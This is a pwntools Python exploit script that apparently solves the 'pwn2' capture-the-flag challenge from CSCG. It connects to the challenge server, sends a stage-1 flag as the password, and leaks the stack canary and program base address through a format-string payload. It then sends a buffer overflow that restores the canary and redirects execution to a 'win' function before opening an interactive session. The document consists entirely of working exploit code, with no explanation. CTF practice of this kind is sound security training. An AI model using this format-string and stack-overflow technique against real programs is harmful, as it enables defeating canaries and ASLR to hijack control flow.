from pwn import *

context.arch = "amd64"
print(ELF("./pwn2"))

# p = process("./pwn2")
p = remote("hax1.allesctf.net", 9101)

p.recvuntil("Enter the password of stage 1:")
p.sendline("CSCG{NOW_PRACTICE_MORE}")

p.recvuntil("Enter your witch name:")
p.sendline("|%39$p|%41$p|")


vals = p.recvuntil("enter your magic spell:").decode("utf-8").split("|")
canary = int(vals[1], 16)
baseadr = int(vals[2], 16) - 0xDC5

print(vals)
print(list(map(p64, [canary, baseadr])))
win = baseadr + 0xB94
# win at 0x555555554b94
# gdb.attach(p)

p.sendline(
    b"Expelliarmus\x00"
    + b"A" * cyclic_find(b"cnaa")
    + p64(canary)
    + b"A" * 8
    + p64(baseadr + 0xDD1)  # ret of main 0x0000555555554dd1
    + p64(win)
)

p.interactive()
